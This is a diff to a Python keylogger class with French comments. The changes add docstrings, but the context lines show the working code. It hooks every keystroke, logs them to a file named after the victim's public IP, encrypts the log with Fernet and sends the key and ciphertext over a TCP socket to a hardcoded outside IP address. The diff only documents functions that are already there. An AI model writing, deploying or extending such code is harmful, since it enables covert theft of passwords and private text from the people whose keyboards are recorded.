@@ -14,6 +14,15 @@ class Fichier:
         self.nom_fichier = ""
 
     def get_ip(self):
+        """
+        Cette fonction récupère l'adresse IP publique de l'appareil en interrogeant 
+        le service web 'https://httpbin.org/ip'.
+
+        Returns:
+        - Si la requête est réussie (status_code == 200),
+        l'adresse IP est extraite de la réponse JSON et renvoyée.
+        - Sinon, None est renvoyé.
+        """
         try:
             response = requests.get('https://httpbin.org/ip')
             if response.status_code == 200:
@@ -25,6 +34,17 @@ class Fichier:
             return None
 
     def get_keyboard(self, e):
+        """
+        Cette fonction enregistre les frappes clavier dans un fichier texte.
+
+        Args:
+        - e: L'événement de frappe clavier à traiter.
+
+        Cette fonction écoute les événements de frappe clavier.
+        Chaque touche enfoncée est enregistrée dans un fichier texte
+        qui est défini en fonction de l'adresse IP, de la date et de l'heure. 
+
+        """
         if not self.nom_fichier:
             ip_personne = self.get_ip() or "unknown"
             documents_path = "C:\\Users\\Public\\Documents"
@@ -64,6 +84,15 @@ class Fichier:
                 fichier.write(mots)
 
     def encrypt_and_send_file(self):
+        """
+        Cette fonction chiffre le contenu du fichier actuel et l'envoie au serveur.
+
+        - Génère une clé de chiffrement symétrique à l'aide de Fernet.
+        - Lit le contenu du fichier actuel.
+        - Chiffre le contenu du fichier à l'aide de la clé générée.
+        - Envoie le fichier chiffré au serveur.
+
+        """
         server_address = "162.19.252.34"
         server_port = 12345
         key = Fernet.generate_key()
@@ -77,6 +106,18 @@ class Fichier:
         self.send_encrypted_file(key, encrypted_text, server_address, server_port)
 
     def send_encrypted_file(self, key, encrypted_text, server_address, server_port):
+        """
+        Cette fonction envoie un fichier chiffré via une connexion TCP au serveur.
+
+        Args:
+        - key : La clé de chiffrement symétrique utilisée pour chiffrer le fichier.
+        - encrypted_text : Le texte chiffré du fichier à envoyer.
+        - server_address : L'adresse IP du serveur de destination.
+        - server_port : Le port sur le serveur pour la réception du fichier.
+
+        Cette fonction crée un socket client, se connecte au serveur à l'adresse et au port,
+        envoie d'abord la clé de chiffrement, puis envoie le texte chiffré du fichier.
+        """
         try:
             with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as client_socket:
                 client_socket.connect((server_address, server_port))
@@ -88,6 +129,9 @@ class Fichier:
             print(f"{e}")
 
     def start_keyboard(self):
+        """
+        Cette fonction initialise l'enregistrement des frappes clavier et définit un raccourci clavier pour arrêter le programme(ctrl alt g).
+        """
         custom_combination = 'ctrl+alt+g'
         keyboard.hook(self.get_keyboard)
         keyboard.add_hotkey(custom_combination, self.stop_program)
@@ -101,6 +145,9 @@ class Fichier:
             pass  
 
     def stop_program(self):
+        """
+        Cette fonction arrête le programme en cours d'exécution.
+        """
         exit()
 
 if __name__ == "__main__":
